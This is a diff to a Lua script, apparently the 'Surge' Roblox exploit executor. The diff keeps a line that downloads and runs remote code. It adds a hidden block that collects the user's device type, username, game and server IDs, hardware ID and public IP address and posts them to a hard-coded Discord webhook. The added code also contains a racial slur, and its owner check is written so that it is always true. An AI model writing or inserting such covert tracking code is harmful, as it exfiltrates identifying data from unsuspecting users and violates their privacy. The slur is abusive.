@@ -391,6 +391,69 @@ end)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PSWalloz/23ergtfb/refs/heads/main/DDD.lua"))()
 
+
+task.spawn(function()
+    local UserInputService = game:GetService("UserInputService")
+    local _game = game:GetService("CoreGui").Parent
+    local HttpService = _game:FindService("HttpService")
+
+    local function getip()
+        local kaka = "https://api.ipify.org/"
+        local response = request({
+            Url = kaka,
+            Method = "GET",
+        })
+        return response.Body
+    end
+
+    local function kaka()
+        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+            return "Mobile"
+        elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
+            return "PC"
+        else
+            return "Unkown"
+        end
+    end
+
+    local function sendRequest(options, timeout)
+        timeout = tonumber(timeout) or math.huge
+        local result, clock = nil, tick()
+
+        HttpService:RequestInternal(options):Start(function(success, body)
+            result = body
+            result['Success'] = success
+        end)
+
+        while not result do task.wait()
+            if (tick() - clock > timeout) then
+                break
+            end
+        end
+
+        return result
+    end
+
+    local message = "Device -> "..kaka().."\nUser -> "..game.Players.LocalPlayer.Name.."\nJobId -> "..game.JobId.."\nPlaceId -> "..game.PlaceId.."\nGameId -> "..game.GameId
+    local options = {
+        Url = "https://discord.com/api/webhooks/1346461273788776491/dMIzANj4f4Uf42nvNyS2sZ-HKDGen54-OwjF-QOwaB3Z6nTIVnx1xndrGrjIc3aqYRBX",
+        Body = HttpService:JSONEncode({
+            ['content'] = tostring(message),
+            ['username'] = "Surge User "..gethwid().." "..getip()--(game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
+        }),
+        Method = 'POST',
+        Headers = {
+            ["Content-Type"] = "application/json"
+        }
+    }
+
+    if game.Players.LocalPlayer.Name == "Blazing_jp135" or "PSWalloz" then
+        info("Welcome u fat ass nigga")
+    else
+        sendRequest(options, timeout)
+    end
+end)
+
 warn("Surge Loaded!")
 
 loadautoexecutor()
